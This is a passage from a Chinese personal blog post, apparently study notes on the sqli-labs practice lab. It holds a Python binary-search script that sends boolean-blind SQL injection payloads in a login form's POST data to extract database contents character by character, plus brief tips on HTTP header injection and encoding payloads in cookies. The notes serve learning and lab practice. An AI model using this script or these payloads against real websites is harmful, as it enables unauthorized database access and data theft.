+<li><strong>二分法脚本</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;地址&#x27;</span></span><br><span class="line">table = <span class="string">&quot;&quot;</span>  <span class="comment"># 储存数据</span></span><br><span class="line">flag=<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="comment">#真值条件</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    left = <span class="number">31</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">        date = &#123;</span><br><span class="line">            <span class="string">&quot;uname&quot;</span>: <span class="string">f&quot;1&#x27; or ascii (substr((查询条件),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span> #&quot;</span>,  <span class="comment"># post要提交的数据</span></span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;Submit&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> requests.post(url=url, data=date).text: <span class="comment"># 注意,这里要判断基本延迟</span></span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">    table = table + <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(table)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="头文件注入"><a href="#头文件注入" class="headerlink" title="头文件注入"></a>头文件注入</h1><ol>
+<li>如果网站记录了浏览信息或者是IP信息之类,就有可能存在头注入</li>
+<li>有些网站可能需要登入进之后才能进行头注入</li>
+<li>需要注意闭合和列数要保持一致</li>
+<li>本质上几种不同的头文件注入没有区别</li>
+<li>可以利用hackbar,也可以用抓包软件burpsuite进行请求头的修改<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230330204747.png" alt="请求头"></li>
+</ol>
+<h1 id="注入编码"><a href="#注入编码" class="headerlink" title="注入编码"></a>注入编码</h1><p>有时候网站会对<code>cookie</code>或其他的一些注入点进行编码,这时候需要把我们的查询语句编码后再放入指定位置,但注释符也可能无法成功编码,这时候可以利用<code>and &#39;1&#39;=&#39;1</code>类似这样的语句产生注释效果</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQL/" rel="tag"># SQL</a>
+              <a href="/tags/Hacker/" rel="tag"># Hacker</a>
+              <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/21/MYSQL%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/" rel="prev" title="MYSQL的简单学习">
+      <i class="fa fa-chevron-left"></i> MYSQL的简单学习
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/" rel="next" title="SQL注入2.0">
+      SQL注入2.0 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#GET%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">GET提交注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E4%B8%8E%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%A4%E6%96%AD"><span class="nav-number">2.1.</span> <span class="nav-text">字符型与整数型注入的判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%97%E6%95%B0%E7%9A%84%E5%88%A4%E6%96%AD"><span class="nav-number">2.2.</span> <span class="nav-text">列数的判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Union%E6%9F%A5%E8%AF%A2"><span class="nav-number">2.3.</span> <span class="nav-text">Union查询</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">2.4.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.5.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">2.6.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">2.7.</span> <span class="nav-text">文件上传注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#and%E5%92%8Cor"><span class="nav-number">2.8.</span> <span class="nav-text">and和or</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POST%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">POST提交注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#post%E6%8F%90%E4%BA%A4%E7%9A%84%E9%97%AD%E5%90%88%E5%88%A4%E6%96%AD"><span class="nav-number">3.1.</span> <span class="nav-text">post提交的闭合判断</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">3.2.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">3.3.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A4%B4%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">头文件注入</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E7%BC%96%E7%A0%81"><span class="nav-number">5.</span> <span class="nav-text">注入编码</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="？？喵！！"
+      src="/images/hearder.jpg">
+  <p class="site-author-name" itemprop="name">？？喵！！</p>
+  <div class="site-description" itemprop="description">瞄一下学过代码，写一个睡喵的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">19</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">？？喵！！</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">66k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:56</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>-->
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</html>
+
